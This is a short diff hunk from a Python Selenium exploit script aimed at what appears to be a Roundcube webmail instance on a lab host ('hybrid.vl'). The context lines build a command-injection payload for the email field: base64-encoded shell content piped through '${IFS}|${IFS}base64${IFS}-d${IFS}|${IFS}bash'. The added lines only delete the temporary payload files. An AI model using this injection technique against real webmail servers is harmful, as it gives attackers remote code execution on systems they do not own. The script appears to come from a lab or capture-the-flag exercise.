@@ -67,6 +67,9 @@ with open ("shell.txt", "r") as f:
 	b = '${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@hybrid.vl'
 	print(f"{MAGENTA}\nEnter the following into email field, everything that is in yellow (yes even the IFS part), then click save {YELLOW}{a}{content}{b}{RESET}\n")
 answer = input(f"\n{RED}Press ENTER to continue{RESET}\n")
+os.remove("a.txt")
+os.remove("b.txt")
+os.remove("shell.txt")
 clickable = driver.find_element(By.ID, "rcmbtn101")
 clickable.click()
 clickable = driver.find_element(By.ID, "rcmliU2VudA")
